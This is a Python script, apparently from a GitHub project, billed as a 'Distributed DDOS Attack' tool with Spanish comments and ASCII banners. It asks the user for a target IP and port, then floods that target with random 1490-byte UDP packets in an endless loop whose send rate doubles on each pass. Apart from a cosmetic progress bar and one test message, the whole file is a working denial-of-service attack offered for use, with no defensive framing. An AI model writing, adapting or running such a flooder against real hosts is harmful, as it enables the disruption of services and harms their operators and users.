import sys
import os
import time
import socket
import random
from datetime import datetime

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
attack_bytes = bytearray(random.getrandbits(8) for _ in range(1490))
##############

# Definir variables de color
AMARILLO = "\033[93m"
BLANCO = "\033[97m"
CYAN = "\033[96m"
VERDE = "\033[92m"
ROJO = "\033[91m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

def title():
    print(VERDE + banner + RESET)
    print(VERDE + "Distributed DDOS Attack" + RESET)
    print(VERDE + "-" * 67 + RESET)
    print("Author : afsh4ck")
    print("Github : https://github.com/afsh4ck")
    print("Follow me on Instagram & YouTube - @afsh4ck")
    print(VERDE + "-" * 67 + RESET)

banner = """
    ____       __                ___    __   __                __  
   / __ \ ____/ /____   _____   /   |  / /_ / /_ ____ _ _____ / /__
  / / / // __  // __ \ / ___/  / /| | / __// __// __ `// ___// //_/
 / /_/ // /_/ // /_/ /(__  )  / ___ |/ /_ / /_ / /_/ // /__ / ,<   
/_____/ \__,_/ \____//____/  /_/  |_|\__/ \__/ \__,_/ \___//_/|_|  
"""

os.system("clear")
title()

# Pedir la dirección IP y el puerto
ip = input(VERDE + "IP Target / Domain : " + RESET)
port = int(input(VERDE + "Port               : " + RESET))

# Mostrar mensaje de inicio del ataque
os.system("clear")
print(VERDE + """
    ___    __   __                __      _____  __                __
   /   |  / /_ / /_ ____ _ _____ / /__   / ___/ / /_ ____ _ _____ / /_
  / /| | / __// __// __ `// ___// //_/   \__ \ / __// __ `// ___// __/
 / ___ |/ /_ / /_ / /_/ // /__ / ,<     ___/ // /_ / /_/ // /   / /_
/_/  |_|\__/ \__/ \__,_/ \___//_/|_|   /____/ \__/ \__,_//_/    \__/
""" + RESET)

# Definir caracteres de la barra de progreso
progress_chars = ["[                     ]", "[=                   ]", "[==                  ]",
                  "[===                 ]", "[====                ]", "[=====               ]",
                  "[======              ]", "[=======             ]", "[========            ]",
                  "[=========           ]", "[==========          ]", "[===========         ]",
                  "[============        ]", "[=============       ]", "[==============      ]",
                  "[===============     ]", "[================    ]", "[=================   ]",
                  "[==================  ]", "[=================== ]", "[====================]"]

for i, progress in enumerate(progress_chars):
    percentage = int((i + 1) / len(progress_chars) * 100)
    sys.stdout.write("\r" + progress.replace("[", "[" + VERDE).replace("]", RESET + "]") + f" {percentage}%")
    sys.stdout.flush()
    time.sleep(0.5)

time.sleep(3)

sent = 0

# Definir una tasa base y un factor de incremento exponencial
base_rate = 0.1  # Paquetes por segundo
exponential_factor = 2  # Factor de incremento exponencial

# Nueva función para enviar mensajes personalizados
def send_message(message, ip, port):
    try:
        # Enviar el mensaje al servidor
        sock.sendto(message.encode(), (ip, port))
        print(f"Message sent: {message}")
    except Exception as e:
        print(f"Error sending message: {e}")

# Ejemplo de envío de mensaje
send_message("Este es un mensaje de prueba al servidor", ip, port)

try:
    while True:
        sock.sendto(attack_bytes, (ip, port))
        sent += 1
        print("Sent %s packet to %s through port:%s" % (sent, ip, port))

        # Incrementar la tasa exponencialmente
        base_rate *= exponential_factor

        # Esperar un tiempo inversamente proporcional a la tasa exponencial
        time.sleep(1 / base_rate)

except KeyboardInterrupt:
    print("\n" + ROJO + "[*] User interrupted the attack." + RESET)
except Exception as e:
    print(f"Error: {e}")
